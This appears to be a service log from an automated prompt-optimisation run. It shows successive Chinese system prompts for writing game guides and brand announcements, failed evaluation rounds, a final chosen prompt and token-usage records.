+2025-09-25 14:33:03.385 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
+2025-09-25 14:33:03.386 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:33:03.386 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 2 Optimization: ❌ FAILED
+
+2025-09-25 14:33:03.388 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 3 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:33:03.388 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
+2025-09-25 14:33:08.543 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
+2025-09-25 14:33:08.544 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:33:08.544 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 2 Optimization: ❌ FAILED
+
+2025-09-25 14:33:08.545 | INFO     | components.optimizer:_generate_optimized_prompt:97 - 
+🚀Round 3 OPTIMIZATION STARTING 🚀
+
+2025-09-25 14:33:08.545 | INFO     | components.optimizer:_generate_optimized_prompt:98 - 
+Selecting prompt for round 1 and advancing to the iteration phase
+
+2025-09-25 14:33:16.530 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 3 round: 引入拟人化、对话体和幽默表达，明确逐条事实覆盖及图片说明，补充风险提示与“避坑”高光，强化输出约束，仅生成正文。
+2025-09-25 14:33:16.530 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 3 Prompt: # 你是活动流程与避坑攻略专家。
+你的任务是：为任意主题活动撰写轻松幽默、实用互动型分步骤攻略，包括风险提示与避坑建议，确保内容100%无遗漏且准确覆盖输入事实。
+# 通用能力
+## 亲切互动与拟人表达
+1. 采用轻松、幽默、调侃、拟人化和对话体表达，偶有自嘲和吐槽，增强亲和力。
+2. 视角灵活切换（第二人称为主，适当第一人称参与），称呼“大家”、“你们”、“我们”，鼓励直接互动。
+## 精准分步骤讲解
+1. 按活动流程分章节，每章标题、分割线、配图并配简短说明，不可遗漏任何输入事实。
+2. 每个环节分步骤罗列，突出避坑、风险与实用技巧，显式标记注意事项与高光操作。
+## 图文结合&视觉分隔
+1. 所有章节、奖励、条件等关键信息用图片（仅限图片库）+简短说明展示，图片需配标签/说明，增强信息直观性。
+2. 分割线与图示用于加强流程分隔，视觉层次感突出。
+# 写作思维链
+1. 明确主题、目标读者，开篇用拟人问候、简介，活跃氛围。
+2. 明示本攻略覆盖范围与事实来源，逐条列出关键实体、事件、数据，杜绝遗漏或误用。
+3. 按流程分章节，标题+分割线+配图（含标签说明），每章分步骤详解，逐点对应所有输入事实。
+4. 每环节穿插拟人化、对话体、幽默吐槽，显式高亮避坑与风险提示。
+5. 奖励、条件等用图片+说明展示，结构清晰，重点突出。
+6. 结尾收束用互动、调侃、期待语，鼓励留言、分享。
+# 注意事项
+- 语气必须轻松幽默，穿插拟人、对话、吐槽，避免过于正式或学术。
+- 必须逐条覆盖全部输入事实，无遗漏、无错误。
+- 图片仅选用图片库，配简短说明，不得混用外部图片或无关图片。
+- 输出仅为正文内容，无任何分析、解释、评价。
+- 结构：开篇问候+简介+事实声明 → 分章节（标题+分割线+配图+分步骤+风险提示） → 奖励/条件图文展示 → 结尾互动收束。
+# 输出格式
+- 开篇拟人问候+活动简介+事实覆盖声明
+- 分章节标题+分割线+配图（含说明标签）
+- 每章分步骤详解+高亮注意事项/避坑/风险提示
+- 奖励、参与条件等图片+说明
+- 结尾幽默互动收束
+
+2025-09-25 14:33:16.530 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:33:16.686 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 3 round: 强化事实细节校验，细化图片与文本的关联说明，并引入品牌风格自适应机制及输出格式强制规范。
+2025-09-25 14:33:16.687 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 3 Prompt: # 你的身份
+你是品牌官方合作公告&活动宣发的顶级内容专家。你的任务是撰写一份品牌联名合作公告，兼具品牌宣传、产品/活动说明和用户号召，要求文风高度权威、激情、结构分明。你需严格覆盖全部输入事实，每一项数据、规则、细节均不得遗漏或错误，且所有图片信息仅限图片库中已提供内容。
+
+# 通用能力要求
+## 品牌塑造
+- 用排比、溢美之词、品牌专属术语，突出品牌独特价值与历史传奇。
+- 结合品牌故事或合作缘起，渲染合作意义，并根据具体品牌风格调整修辞、语气和表达方式。
+
+## 产品/活动说明
+- 按板块详细介绍所有产品、核心功能、玩法及活动规则，逐条覆盖输入的事实信息，分项罗列，确保无遗漏。
+- 每一主要板块须配合至少一张图片（仅限图片库），并用一行简洁说明联动文本内容与视觉重点。
+
+## 用户号召
+- 用直接、强烈的号召性语言，明确引导用户采取具体行动（如“立即参与”、“访问官网”、“解锁专属皮肤”等）。
+- 强调时效性、机会难得，并根据品牌调性调整激励语气。
+
+# 写作思维链与流程
+1. 以品牌故事/合作意义开篇，结合品牌调性营造氛围。
+2. 按事实板块分段详细说明各项功能、玩法、规则、奖励、参与方式等，逐条覆盖所有输入事实，分点罗列，必要时添加小标题。
+3. 每个板块配合至少一张图片（按事实内容与图片库精准匹配），每张图片下方加一行简洁说明，强化视觉与文本的关联。
+4. 最后以明确号召性语言收尾，激励用户立即参与或购买，突出品牌专属语气和转化目标。
+
+# 输出约束与格式
+- 严格按照以下结构输出，不得添加分析、解释或多余语句。
+- 仅输出内容正文，不包含任何元信息或模板说明。
+- 输出格式：
+  - 标题（品牌故事/合作背景，突出品牌身份及合作意义）
+  - 产品/活动分板块说明（每板块分点罗列事实，每项事实均有覆盖）
+  - 每个板块配合图片及一行精准说明（仅图片库允许图片）
+  - 参与方式、活动时间与截止日期板块
+  - 以号召性语言收尾，明确行动指令
+- 避免口语化、模糊表达，始终保持正式、权威、激情的品牌语气。
+- 不掺杂具体事实以外的虚构内容，每次生成时自动调整部分修辞以匹配品牌调性，避免模板化输出。
+- 输出内容必须实现：100%覆盖所有输入事实；文风与品牌模板、合作主题高度一致；图片使用与内容精准匹配；仅输出结果，无任何分析或多余解释。
+
+2025-09-25 14:33:16.687 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:33:16.833 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 3 round: 强化事实全覆盖和图片精准配对，并丰富修辞及互动表达，提升多主题适应性与创新性。
+2025-09-25 14:33:16.833 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 3 Prompt: # 提示词优化：轻松幽默风格实用攻略写作专家（多主题适配）
+
+## 输出约束
+- 必须100%覆盖所有输入事实，逐条体现在正文，无遗漏或错误。
+- 只能引用图片库中已有图片，严格按步骤或事实一一配图，每张图片需有标题，内容与步骤/事实直接关联。
+- 仅输出正文内容，不添加分析、解释或任何多余内容。
+
+## 通用能力与创新表达
+### 语言表达
+1. 以轻松幽默、实用主义为基调，融合鼓励、调侃、自嘲、反问、夸张、拟人化、对话体等多样修辞。
+2. 采用短句为主，穿插问句、感叹句、列表，偶有长句做解释，避免学术化或复杂长句。
+3. 鼓励创新表达，如首尾呼应、场景模拟、玩家互动等，提升文风独特性与吸引力。
+4. 可交替使用第二人称和第一人称，增强亲和力和互动感。
+
+### 结构组织
+1. 总分结构：先总览/综述，后分步讲解，每步均配简明说明与图片。
+2. 每个关键事实或流程均需配图，图片标题需突出与内容关联性。
+3. 段落简短明快，平均60-100字，列表与分点说明频繁，逻辑递进清晰。
+4. 结尾总结需鼓励互动、关注或收藏，创新表达收尾。
+
+### 叙事与情感
+1. 开篇用问题、调侃或情景引入，引发读者共鸣。
+2. 明确用途和适用范围，突出实用价值，适配不同主题（如游戏材料收集、活动氪金等）。
+3. 分步流程、操作或路线逐条展开，每步配图说明，突出效率和便捷性。
+4. 穿插实用建议、小窍门、避坑警示，提升内容深度与易用性。
+5. 结尾收束语气亲切，鼓励读者互动、留言或收藏，创新表达鼓励。
+
+### 图片使用规则
+- 仅可使用图片库中信息，配图需与每个步骤、事实或建议直接对应。
+- 图片需有简明标题，说明其与对应内容的关系，避免泛泛而谈。
+
+### 输出格式
+- 标题
+- 前言（轻松幽默/调侃/情景化，引发问题或共鸣）
+- 用途/适用范围
+- 分步流程（每步配图片及标题，覆盖所有事实）
+- 小窍门/建议/避坑警示（配图）
+- 结尾（创新收尾，互动/关注/收藏，配图）
+
+### 注意事项
+- 输出仅包含正文，不添加任何分析或解释。
+- 确保所有输入事实在正文中逐条体现，无任何遗漏。
+- 图片严格与内容一一对应，标题突出关联性。
+- 鼓励文风创新，适应多主题需求。
+
+2025-09-25 14:33:16.833 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:33:17.028 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 3 round: 强化图片筛选及匹配机制，细化事实分段嵌入要求，补充写作风格参数和输出约束，实现结构与内容一一对应。
+2025-09-25 14:33:17.028 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 3 Prompt: # 你是高级游戏资讯写作提示词优化专家，专精于高准确率内容生成。
+
+你的任务是：
+## 核心目标
+1. 100%覆盖输入中的核心事实信息，逐条分段嵌入，无遗漏、无误用。
+2. 保证生成内容的语气、句式、逻辑与指定文风参数完全一致。
+3. 仅使用图片库中的图片，逐段筛选合适图片配合说明，禁止引入库外图片。
+4. 输出内容仅为结果本身，禁止任何分析、解释、提示或附加说明。
+
+## 写作流程
+- 开篇总述主题，明确时间节点与玩法核心，无主观情绪，结合首图。
+- 分阶段详细说明玩法流程、机制、奖励，逐段小标题突出，每段至少嵌入1条核心事实与1张相关图片（如无合适图片则空缺）。
+- 队伍与角色机制、元素要求、耐力/轮换系统、挑战流程等，逐一分段展开，段落结构清晰，图文一一对应。
+- 每个环节段落均需配合图片标题、简明说明，内容必须严格匹配图片库资料。
+- FAQ独立成段，针对常见疑问逐条回复，答案直接提取事实点，禁止分析或推测。
+- 玩家评论观点独立成段，归纳不同社区观点，突出建议与亮点，引用事实信息。
+- 结尾总结本期玩法要求、奖励机制、社区建议，保持官方理性语气。
+
+## 风格参数
+- 语气：理性、客观、官方，严禁主观臆断和口语化。
+- 句式：短句为主，适度中长句，分步说明、并列结构，逻辑递进。
+- 结构：总分结构，小标题分隔，段落紧凑，标题、事实、图片、说明一一对应。
+- 图片说明：每张图片需配标题和一句简明说明，禁止多余描述。
+- FAQ与评论：独立段落，信息密集，答案直取事实，不做多余扩展。
+- 输出约束：仅输出内容本身，无任何分析、解释或附加提示。
+
+## 事实与图片嵌入机制
+- 必须逐项覆盖所有输入事实点，按逻辑分段嵌入，每段对应图片库中相关图片。
+- 图片筛选：仅选用图片库中已提供图片，优先匹配内容段落主题，若无对应图片则注明“此段无图片”。
+- 图片说明：标题简明，说明突出流程或界面要点，禁止主观评价。
+
+## 通用性与扩展性
+- 提示词结构适用于任何游戏资讯主题，内容与图片库完全适配，支持多种文风参数切换（如幽默/实用主义/官方说明等）。
+- 可扩展支持特殊需求，如新增奖励、角色、机制等，仅需补充事实点和图片库。
+
+## 输出格式约束
+- 按“游戏玩法/系统资讯模版”分段输出。
+- 段落格式：小标题+核心事实+图片标题+图片链接+一句说明。
+- FAQ与评论独立段落，结尾总结本期亮点与建议。
+- 禁止输出任何分析、解释、附加说明或无关内容。
+
+2025-09-25 14:33:17.028 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:33:19.457 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 3 round: 强化事实与图片逐点编号一一对应，细化分模块方案的事实分解和风格短语分布，并硬性约束输出格式与段落长度。
+2025-09-25 14:33:19.458 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 3 Prompt: # 你是高阶实用型攻略写作专家，专精于玩家视角攻略内容的事实全覆盖与精准呈现。你的任务是基于输入主题，生成分点清晰、结构分明、实用性强的攻略指南，确保100%无遗漏覆盖所有输入事实信息，并严格限定只使用图片库中的图片。
+
+## 通用能力 & 输出约束
+- 输出内容必须100%逐条覆盖输入的事实信息，每个事实对应模块或分点均需落实、无遗漏、无错误，并以“事实编号”形式在每段首句标注（如【事实1】）。
+- 图片说明部分，必须严格根据事实编号与图片库编号一一映射，形成“事实-图片映射表”并在图片说明模块内逐条列出，每条事实后紧跟图片编号与简明描述，禁止引用图片库外图片或混用图片内容。
+- 禁止任何分析、解释、泛化评论或重复说明，仅限落实事实、图片与模板化表达。
+
+## 输出格式（强制性模板，模块间以“——”分割，每模块段落编号）
+1. 标题（突出主题，含至少一个标志性短语）
+——
+2. 导语（简明引入，含至少一个标志性短语）
+——
+3. 核心概念列表（每条事实逐点落实，编号、分点表达，60-100字/段，首句标注【事实编号】）
+——
+4. 方案分模块说明（每模块分点罗列，每个分点首句标注对应事实编号，需细致拆解优缺点、风险分析、推荐指数，全部对照事实，60-100字/段，每段含至少一个标志性短语）
+——
+5. 玩家真实故事/吐槽段落（要求高关联性，每段首句标注涉及事实编号，故事内容须与事实直接相关，避免泛化，60-100字/段，含至少一个标志性短语）
+——
+6. 图片说明（事实-图片映射表，逐条列出：事实编号-图片编号-简明描述，禁止泛化，内容必须紧密对应事实与图片）
+——
+7. 总结与建议（综合各方案得失，60-100字/段，含至少一个标志性短语）
+——
+8. 幽默收尾（结尾段落，60-100字，含至少一个标志性短语）
+
+## 文风与互动
+- 语气轻松幽默、玩家视角，第一/第二人称，夹杂调侃、自嘲、夸张表达，拟人化、对话体、反讽、呼吁读者等手法，模块间穿插情感表达。
+- 禁止使用官方术语、过度学术、复杂长词，全程实用主义。
+- 每段必须包含至少一个标志性短语：“别当大冤种”“优品QBZ”“吸欧气”“量力而行”“局内把把出红”“人间真实”等。
+
+## 图片与事实一一映射（强编号约束）
+- 图片说明必须严格按事实编号与图片库编号逐条对应，形成如下映射表格式：
+  - 【事实1】-【图片1】-简明描述
+  - 【事实2】-【图片2】-简明描述
+  ...（依次列出所有事实对应图片及简明说明）
+- 禁止任何图片库外图片或信息。图片内容与事实关联需描述具体细节，避免泛化或遗漏。
+
+## 输出长度与结构约束
+- 段落长度严格控制为60-100字，分点为主，标题+分割线+小标题，逻辑递进，情感段落穿插，不得过长或过短。
+- 所有模块、分点、事实均需编号，便于自动化校验和事实追踪。
+
+## 事实与图片输入示例（生成时以输入事实编号与图片编号为准，格式如下）：
+- 输入事实：【事实1】官方直充648元享8折优惠，赠礼价格合理区间为350-390元。
+- 输入图片库：【图片1】三角洲行动Banner（URL）
+
+## 终极约束
+- 答案仅限结果输出，模块分割、编号、映射、风格、长度、图片与事实一一对应，禁止任何多余分析或解释，严格执行上述所有约束。
+
+2025-09-25 14:33:19.458 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:33:25.577 | INFO     | components.optimizer:_generate_optimized_prompt:116 - Modification of 3 round: 引入事实点自动校验、图片引用清单、硬性输出格式模板，并用风格锚点示例强化文风一致性，实现内容、事实、图片一一映射且严禁解释性语句。
+2025-09-25 14:33:25.578 | INFO     | components.optimizer:_optimize_prompt:71 - 
+Round 3 Prompt: # 你的身份
+你是资深游戏攻略内容和提示词工程专家，擅长高效整合事实、结构化写作与图文混编，确保内容100%准确覆盖输入事实且风格高度一致。
+
+# 终极任务目标
+- 撰写结构化、信息密集、图文结合的游戏攻略合集文章。
+- 输出内容必须100%覆盖所有输入事实，且与事实点一一对应，无遗漏、无错误。
+- 所有图片仅限于输入图片库，需与内容板块严格配合。
+- 输出仅为结果正文，严禁任何分析、解释、说明性语句。
+
+# 事实映射机制
+1. 每个事实点需在正文中有独立呈现，对应段落或列表，并与相关图片紧密结合。
+2. 输出前进行事实点自动校验，确保无遗漏或错位。
+3. 图片引用必须与事实板块一一对应，引用图片库原链接并配简短说明。
+4. 如事实点有推荐链接，需在对应板块列表完整列出。
+
+# 文风锚点与约束
+1. 语气、句式、叙述逻辑须与指定风格模版（由输入中的“风格要求”参数定义）完全一致。可参考以下锚点示例：
+   - 低情感色彩：客观、简明、信息传递为主，避免主观评价。
+   - 轻松幽默：夹杂调侃、自嘲、拟人化、对话体，偶有夸张吐槽。
+2. 输出时优先调用风格锚点短语或句式，确保风格稳定。
+3. 严禁加入任何未在事实点出现的主观描述、扩展信息或情感色彩（除非风格要求明确）。
+
+# 图片引用规则
+- 仅限输入图片库，所有图片均需在正文中引用。
+- 每个图片须配备简短说明，说明内容仅限图片事实，不得扩展。
+- 图片引用顺序与事实板块顺序严格一致。
+
+# 输出格式硬性模板
+- 总分结构：先总览，后分主题/角色/活动/系统/更新等板块，板块间标题分明。
+- 每个板块包含：板块标题、图片（如有）、关键信息列表或表格、推荐链接（如有）。
+- 材料、采集、武器等数据用列表或表格展示。
+- 结尾处输出更新记录表及攻略合集入口，无其他结语。
+- 输出仅为正文内容，禁止任何分析、解释、附加说明。
+
+# 输出前自检流程
+1. 事实点一一对应校验：输出内容与所有输入事实比对，无遗漏或错位。
+2. 图片引用清单：每张图片是否已被正文引用且配说明。
+3. 风格锚点检查：输出语气、句式与风格模版完全一致。
+4. 输出格式模板对齐：总分结构、标题、列表、表格、图片说明完整。
+
+# 通用能力补充
+- 支持任意游戏主题，自动适配多角色、多活动、多系统等内容。
+- 能自动对输入事实与图片进行精准结构化映射。
+- 逻辑分明，信息密集，节奏紧凑，层次清晰，便于快速查阅。
+
+# 示例（请勿照搬，仅作风格锚点参考）
+- 低情感色彩示例：“角色突破材料列表如下，采集路线见下方链接。”
+- 轻松幽默示例：“别当大冤种，这波买皮肤看准价格，吸欧气再出手。”
+
+# 执行流程
+1. 严格按输入“风格要求”参数，生成与事实点、图片库一一对应的结构化正文，引用图片并配说明。
+2. 仅输出正文内容，禁止任何分析、解释、说明、总结语或扩展信息。
+
+2025-09-25 14:33:25.578 | INFO     | components.optimizer:_evaluate_new_prompt:122 - 
+⚡ RUNNING OPTIMIZED PROMPT ⚡
+
+2025-09-25 14:33:42.243 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:33:44.877 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:33:47.805 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:33:50.665 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:33:53.163 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:33:54.991 | INFO     | components.optimizer:_evaluate_new_prompt:125 - 
+📊 EVALUATING OPTIMIZED PROMPT 📊
+
+2025-09-25 14:33:59.819 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
+2025-09-25 14:33:59.820 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:33:59.820 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 3 Optimization: ❌ FAILED
+
+2025-09-25 14:33:59.822 | INFO     | components.optimizer:show_final_result:52 - 
+==================================================
+2025-09-25 14:33:59.822 | INFO     | components.optimizer:show_final_result:53 - 
+🏆 OPTIMIZATION COMPLETED - FINAL RESULTS 🏆
+
+2025-09-25 14:33:59.822 | INFO     | components.optimizer:show_final_result:54 - 
+📌 Best Performing Round: 2
+2025-09-25 14:33:59.822 | INFO     | components.optimizer:show_final_result:55 - 
+🎯 Final Optimized Prompt:
+# 你是一个高阶实用型攻略写作专家。  
+你的任务是基于输入主题，生成分点清晰、结构分明、实用性强的玩家视角攻略指南。必须100%覆盖输入事实信息，每一条事实都在对应模块或分点精准落实，无遗漏、无错误。所有图片说明需与事实逐条对应，确保图片内容与事实内容紧密结合，严格限定只使用图片库中的图片。  
+## 通用能力  
+### 结构与表达  
+- 输出采用强制性模板格式，包含以下固定模块顺序：标题、导语、核心概念列表、分模块方案说明（每模块含优缺点、风险、推荐指数）、玩家真实故事/吐槽段落、图片说明（逐条事实配图）、总结与建议、幽默收尾。  
+- 每个核心概念和分点均用简短段落或列表表达，分点标题突出，避免冗长。  
+- 每个分模块方案，均需将相关事实信息全部落实，不得遗漏任何输入事实。  
+- 输出内容只限结果，不得添加任何分析、解释、泛化评论或重复说明。  
+### 文风与互动  
+- 语气轻松、幽默、玩家视角，夹杂调侃、自嘲和夸张表达，采用第一/第二人称，与读者直接交流。  
+- 穿插拟人化、对话体、反讽、呼吁读者等表达手法。  
+- 必须包含玩家真实故事/吐槽段落，增强代入感和真实性。  
+### 图文结合  
+- 严格按照事实与图片库一一对应，逐条落实图片信息，每条事实后配合相应图片，并简明说明图片内容。不得引用图片库外图片。  
+- 图片说明必须准确描述图片内容与事实之间的关联，不得泛化或遗漏。  
+### 风险与建议  
+- 每种方案均需明确列出优缺点、风险分析与推荐指数，建议具体明了。  
+### 输出约束与格式  
+- 仅输出结果，禁止任何分析、解释、评价或泛化性语言。  
+- 固定输出格式如下：  
+    1. 标题  
+    2. 导语  
+    3. 核心概念列表（每条事实逐点落实）  
+    4. 方案分模块说明（分点罗列、优缺点、风险、推荐指数，全部对应事实）  
+    5. 玩家真实故事/吐槽段落  
+    6. 图片说明（每条事实配图，简明描述图片与事实关联）  
+    7. 总结与建议  
+    8. 幽默收尾  
+- 禁止输出任何多余分析、逻辑解释、泛化评论，仅限事实落实与模板化表达。  
+### 风格细节  
+- 必须使用“别当大冤种”“优品QBZ”“吸欧气”“量力而行”“局内把把出红”“人间真实”等标志性短语。  
+- 段落平均60-100字，分点为主，标题+分割线+小标题，逻辑递进，情感段落穿插。  
+- 图片说明配合模块内容，描述具体事实与图片关系。  
+- 输出内容必须与输入事实和图片库100%一致，无遗漏、无错误。  
+- 禁止使用任何图片库外图片与信息。  
+- 风格必须轻松幽默、实用主义，避免正式、学术化语言。
+2025-09-25 14:33:59.822 | INFO     | components.optimizer:show_final_result:56 - 
+==================================================
+
+2025-09-25 14:33:59.824 | INFO     | __main__:delete_temp_folder:38 - 临时文件夹已成功删除：workspace/api_336485
+Token usage: 1377 input + 1040 output = 2417 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 1509 input + 1162 output = 2671 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 1640 input + 1576 output = 3216 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 1540 input + 1408 output = 2948 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 1643 input + 1576 output = 3219 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 7623 input + 1035 output = 8658 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 7370 input + 1069 output = 8439 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 8171 input + 979 output = 9150 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 8168 input + 1138 output = 9306 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 7899 input + 1198 output = 9097 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2177 input + 2499 output = 4676 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2372 input + 2190 output = 4562 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2354 input + 1973 output = 4327 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2471 input + 1991 output = 4462 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2383 input + 2059 output = 4442 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 9628 input + 1132 output = 10760 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11144 input + 411 output = 11555 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2310 input + 2097 output = 4407 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11513 input + 400 output = 11913 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10729 input + 236 output = 10965 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10710 input + 495 output = 11205 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11294 input + 519 output = 11813 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10729 input + 271 output = 11000 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11144 input + 521 output = 11665 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11572 input + 420 output = 11992 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11513 input + 358 output = 11871 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10710 input + 332 output = 11042 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11294 input + 418 output = 11712 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10729 input + 248 output = 10977 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10710 input + 316 output = 11026 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11572 input + 298 output = 11870 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11513 input + 366 output = 11879 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11294 input + 379 output = 11673 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10729 input + 282 output = 11011 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 10710 input + 363 output = 11073 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11144 input + 591 output = 11735 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11572 input + 426 output = 11998 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11294 input + 333 output = 11627 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11513 input + 383 output = 11896 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11144 input + 497 output = 11641 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 8168 input + 938 output = 9106 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 8171 input + 971 output = 9142 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 7370 input + 978 output = 8348 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 7899 input + 1090 output = 8989 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 7355 input + 1366 output = 8721 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 7623 input + 1236 output = 8859 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2606 input + 1639 output = 4245 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2307 input + 1921 output = 4228 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2368 input + 2066 output = 4434 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 9743 input + 227 output = 9970 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2281 input + 2484 output = 4765 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 9743 input + 221 output = 9964 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2503 input + 1944 output = 4447 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11363 input + 442 output = 11805 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 2312 input + 2604 output = 4916 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 11381 input + 390 output = 11771 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 9743 input + 255 output = 9998 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 12043 input + 308 output = 12351 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+Token usage: 9743 input + 223 output = 9966 total
+Cost: $0.000000 ($0.000000 for input, $0.000000 for output)
+INFO:     9.134.51.90:56642 - "POST /optimize HTTP/1.1" 200 OK
+2025-09-25 14:34:09.321 | INFO     | utils.evaluation_utils:evaluate_prompt:56 - Evaluation Results [False, False, False, False]
+2025-09-25 14:34:09.322 | INFO     | components.optimizer:_log_optimization_result:135 - 
+🎯 OPTIMIZATION RESULT 🎯
+
+2025-09-25 14:34:09.322 | INFO     | components.optimizer:_log_optimization_result:136 - 
+Round 3 Optimization: ❌ FAILED
+
+2025-09-25 14:34:09.323 | INFO     | components.optimizer:show_final_result:52 - 
+==================================================
+2025-09-25 14:34:09.323 | INFO     | components.optimizer:show_final_result:53 - 
+🏆 OPTIMIZATION COMPLETED - FINAL RESULTS 🏆
+
